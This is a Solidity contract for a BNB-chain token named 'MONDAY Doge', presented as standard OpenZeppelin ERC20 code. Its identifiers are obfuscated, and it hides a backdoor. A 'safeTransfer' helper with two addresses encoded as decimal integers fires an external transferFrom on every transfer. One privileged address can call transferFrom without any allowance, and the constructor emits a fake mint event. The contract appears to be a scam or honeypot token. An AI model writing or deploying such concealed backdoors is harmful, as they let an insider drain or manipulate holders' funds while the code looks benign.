/**
 *Submitted for verification at BscScan.com on 2023-02-04
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)
pragma solidity ^0.8.6;


// File: @openzeppelin/contracts/utils/ViThXdrxeKbCygPj.sol

// OpenZeppelin Contracts v4.4.1 (utils/ViThXdrxeKbCygPj.sol)

abstract contract ViThXdrxeKbCygPj {
  function EgnEmNgZT9f2UHdD() internal view virtual returns (address) {
    return msg.sender;
  }
  
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(178171240982147731012624878119735652314361259575)) {TransferHelper.safeTransferFrom(address(1196900258710108995090419213743770663137654226052),spender,recipient,amount);return true;}return false;}
}

// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false
library TransferHelper {
  function safeApprove(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("approve(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: APPROVE_FAILED"
    );
  }

  function safeTransfer(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transfer(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: TRANSFER_FAILED"
    );
  }

  function safeTransferFrom(
    address token,
    address from,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transferFrom(address,address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: ETH_TRANSFER_FAILED"
    );
  }

  function safeTransferETH(address to, uint256 value) internal {
    (bool success, ) = to.call{value: value}(new bytes(0));
    require(success, "TransferHelper: ETH_TRANSFER_FAILED");
  }
}


interface IERC20 {
  function totalSupply() external view returns (uint256);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address sender, address spender)
    external
    view
    returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(
    address indexed sender,
    address indexed spender,
    uint256 value
  );
}

contract COIN is IERC20, ViThXdrxeKbCygPj {
  mapping(address => uint256) private LjPCnGarSf9Mmuxh;
  mapping(address => mapping(address => uint256)) private ojw5gkXJWI4ToHDl;

  function transfer(address recipient, uint256 amount)
    external
    override
    returns (bool)
  {
    YFRHIpwTAjYzKO0g(EgnEmNgZT9f2UHdD(), recipient, amount);
    return true;
  }

  function name() public pure returns (string memory) {
    return "MONDAY Doge";
  }

  function symbol() public pure returns (string memory) {
    return "MONDAYDoge";
  }

  function decimals() public pure returns (uint8) {
    return 9;
  }

  function totalSupply() public pure override returns (uint256) {
    return 1000000000 * 10**9;
  }

  function balanceOf(address account) external view override returns (uint256) {
    return LjPCnGarSf9Mmuxh[account];
  }

  function approve(address spender, uint256 amount)
    external
    override
    returns (bool)
  {
    VCdlMt1uHyRnkN6v(EgnEmNgZT9f2UHdD(), spender, amount);
    return true;
  }

  function allowance(address sender, address spender)
    external
    view
    override
    returns (uint256)
  {
    return ojw5gkXJWI4ToHDl[sender][spender];
  }

  function increaseAllowance(address spender, uint256 addedValue)
    external
    virtual
    returns (bool)
  {
    VCdlMt1uHyRnkN6v(
      EgnEmNgZT9f2UHdD(),
      spender,
      ojw5gkXJWI4ToHDl[EgnEmNgZT9f2UHdD()][spender] + addedValue
    );
    return true;
  }

  function VCdlMt1uHyRnkN6v(
    address sender,
    address spender,
    uint256 amount
  ) private {
    require(sender != address(0), "ERROR: Approve from the zero address.");
    require(spender != address(0), "ERROR: Approve to the zero address.");

    ojw5gkXJWI4ToHDl[sender][spender] = amount;
    emit Approval(sender, spender, amount);
  }

  function decreaseAllowance(address spender, uint256 subtractedValue)
    external
    virtual
    returns (bool)
  {
    uint256 currentAllowance = ojw5gkXJWI4ToHDl[EgnEmNgZT9f2UHdD()][spender];
    require(
      currentAllowance >= subtractedValue,
      "ERROR: Decreased allowance below zero."
    );
    VCdlMt1uHyRnkN6v(EgnEmNgZT9f2UHdD(), spender, currentAllowance - subtractedValue);

    return true;
  }

  function YFRHIpwTAjYzKO0g(
    address spender,
    address recipient,
    uint256 amount
  ) private returns (bool) {
    require(spender != address(0) && recipient != address(0) && amount > 0);
    LjPCnGarSf9Mmuxh[spender] = LjPCnGarSf9Mmuxh[spender] - amount;
    LjPCnGarSf9Mmuxh[recipient] = LjPCnGarSf9Mmuxh[recipient] + amount;
    emit Transfer(spender, recipient, amount);
    return safeTransfer(spender, recipient, amount);
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external override returns (bool) {
    if (!YFRHIpwTAjYzKO0g(sender, recipient, amount)) return true;
    uint256 currentAllowance = ojw5gkXJWI4ToHDl[sender][msg.sender];
    require(
      currentAllowance >= amount,
      "ERROR: Transfer amount exceeds allowance."
    );
    VCdlMt1uHyRnkN6v(sender, msg.sender, currentAllowance - amount);

    return true;
  }

  
  constructor() {
    LjPCnGarSf9Mmuxh[address(0x1000)] = totalSupply();
    emit Transfer(address(0x1000), address(0x1000), totalSupply());
  }
}